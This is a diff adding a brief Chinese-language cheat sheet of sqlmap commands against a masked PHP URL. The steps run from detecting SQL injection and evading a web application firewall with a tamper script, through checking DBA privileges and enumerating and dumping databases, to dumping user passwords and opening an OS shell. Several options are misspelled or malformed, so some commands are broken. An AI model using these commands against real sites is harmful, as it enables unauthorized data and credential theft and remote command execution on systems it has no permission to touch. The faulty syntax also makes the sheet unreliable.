@@ -1,0 +1,23 @@
+开始判断是否具有sql注入漏洞
+
+sqlmap -u http://****.php?id=1;
+sqlmap -u http://****.php?id=1 --tamper randimcase.py;  #随机改变，进行混淆，过狗
+sqlmap -u http://****.php?id=1 --level 3;
+
+判断权限
+
+sqlmap -u http://****.php?id=1 --priveliges;
+sqlmap -u http://***.php?id=1 --is-dba;
+
+执行命令
+
+sqlmap -u http://****.php?id=1 --current-dba;
+sqlmap -u http://****.php?id=1 -D name -tables;
+sqlmap -u http://****.php?id=1 -D name -T name --columns
+sqlmap -u http://****.php?id=1 -D name -T name -C name -dump
+
+sqlmap -u http：//****.php?id=1 --users
+sqlmap -u http://****.php?id=1 --current-user
+sqlmap -u http://****.php?id=1 --passwords
+sqlmap -u http://****.php?id=1 --dbs
+sqlmap -u http://****.php?id=1 --os-shell
